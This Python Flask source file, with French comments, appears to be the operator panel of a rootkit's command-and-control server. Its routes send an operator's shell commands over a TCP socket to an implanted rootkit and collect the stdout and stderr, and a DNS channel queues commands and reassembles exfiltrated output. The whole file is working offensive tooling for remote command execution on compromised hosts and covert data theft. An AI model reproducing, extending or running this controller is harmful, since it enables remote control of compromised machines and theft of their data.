from app import app
import config as cfg
from flask import render_template, redirect, url_for, request
from pages.download import assemble_exfil
import socket
from utils.socket import send_to_server, receive_from_server

# --------------------------------- TERMINAL --------------------------------- #

@app.route('/terminal')
def terminal():
    if not cfg.authenticated:
        return redirect(url_for('login'))
    return render_template("terminal.html", response=last_response, history=cfg.command_history, last_channel=last_channel)

# ------------------------------- SEND COMMAND ------------------------------- #

@app.route('/send', methods=['POST'])
def send():
    global last_channel
    global last_response
    if not cfg.authenticated:
        return redirect(url_for('login'))

    channel = request.form.get('channel','tcp')
    last_channel = channel 
    cmd = request.form.get('command', '').strip()
    if not cmd:
        return redirect(url_for('terminal'))

    # Ajout de la commande dans l'historique
    command_entry = {"command": cmd, "stdout": "", "stderr": ""}
    cfg.command_history.append(command_entry)

    if channel == 'dns':
        cfg.command_queue.append(cmd)
        last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}

        out = assemble_exfil()

        if out:
            last_response = {"stdout": out, "stderr": ""}
            command_entry["stdout"] = out
        else:
            last_response = {"stdout": "", "stderr": "⚠️ no DNS response"}
            command_entry["stderr"] = last_response["stderr"]

    else:
        try:
            with cfg.connection_lock:
                send_to_server(cfg.rootkit_connection, cmd)
                if 'killcom' in cmd.lower():
                    cfg.rootkit_connection.close()
                    last_response = {"stdout": "", "stderr": "Connexion terminée."}
                    return redirect(url_for('dashboard'))

                cfg.rootkit_connection.settimeout(3)
                try:
                    chunks = []
                    cfg.rootkit_connection.settimeout(1)
                    while True:
                        try:
                            part = receive_from_server(cfg.rootkit_connection)
                            print(part)
                            if not part:
                                break
                            chunks.append(part)
                        except socket.timeout:
                            break
                    response = ''.join(chunks)

                    stdout_marker = "stdout:"
                    stderr_marker = "stderr:"

                    if stdout_marker in response and stderr_marker in response:
                        start_stdout = response.index(stdout_marker) + len(stdout_marker)
                        start_stderr = response.index(stderr_marker) + len(stderr_marker)

                        stdout_content = response[start_stdout:response.index(stderr_marker)].strip()
                        stderr_content = response[start_stderr:].strip()

                        last_response = {
                            "stdout": stdout_content, 
                            "stderr": stderr_content
                        }

                        # Enregistrer la sortie dans l'historique
                        command_entry["stdout"] = stdout_content
                        command_entry["stderr"] = stderr_content

                    else:
                        last_response = {"stdout": response.strip(), "stderr": ""}
                        command_entry["stdout"] = response.strip()
                        command_entry["stderr"] = ""

                except socket.timeout:
                    last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
                finally:
                    cfg.rootkit_connection.settimeout(None)

        except Exception as e:
            last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}

    return redirect(url_for('terminal'))